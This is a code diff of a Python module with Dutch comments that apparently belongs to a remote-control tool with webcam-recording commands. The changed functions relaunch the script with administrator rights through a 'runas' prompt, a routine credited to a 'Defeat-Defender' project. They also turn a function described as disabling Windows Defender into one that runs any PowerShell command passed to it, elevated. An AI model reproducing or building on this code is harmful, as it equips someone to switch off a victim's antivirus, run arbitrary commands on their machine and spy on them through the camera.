@@ -1,5 +1,5 @@
 # Deze file bevat alle functies die binnen de async commands uitgevoerd kunnen wordt
-import cv2, os, time, subprocess, sys, subprocess, ctypes
+import cv2, os, time, subprocess, sys, ctypes
 
 # functie die afgedraaid wordt om de banner te maken
 def get_banner() -> str:
@@ -82,23 +82,25 @@ def get_camRecording():
     return filepath
 
 
-# windows defender uitzetten via python met powershell
-ASADMIN = "asadmin"
-def end_defender():
-    # Source: https://github.com/witchfindertr/Defeat-Defender-Python-Version-/blob/c2a43b4b2f570b87259ca368a98d2e3ab3572dff/Defeat-Defender.py#L11-L15
-    if sys.argv[-1] != ASADMIN:
-        # haalt de path of van deze script
+# functie om admin rechten aan te zetten
+# Source: https://github.com/witchfindertr/Defeat-Defender-Python-Version-/blob/c2a43b4b2f570b87259ca368a98d2e3ab3572dff/Defeat-Defender.py#L11-L15
+def get_adminRights():
+    """Maak een terminal open met admin rechten, en sluit de oude (zonder admin rechten)"""
+    if sys.argv[-1] != "asadmin":
         script = os.path.abspath(sys.argv[0])
-        # start deze functie opnieuw maar dit keer met admin rechten voor de file waarin deze script in staat
-        params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
+        params = ' '.join([script] + sys.argv[1:] + ['asadmin'])
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
-        # sluit de powershell die geen admin rechten heeft
         sys.exit(0)
 
-    # dit is de powershell command die uitgevoerd moet worden
-    completed = subprocess.run(
-        ["powershell", "-Command", "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled"], 
+# windows defender uitzetten via python met powershell
+def end_defender(cmd):
+    # zet admin rechten aan
+    get_adminRights()
+
+    # dit is de powershell command die uitgevoerd moet worden (deze command heeft adim rights nodig)
+    runCommand = subprocess.run(
+        ["powershell", "-Command", cmd], 
         capture_output=True, text=True
     )
-    print(completed.stdout)
-    return completed
+
+    return runCommand.stdout
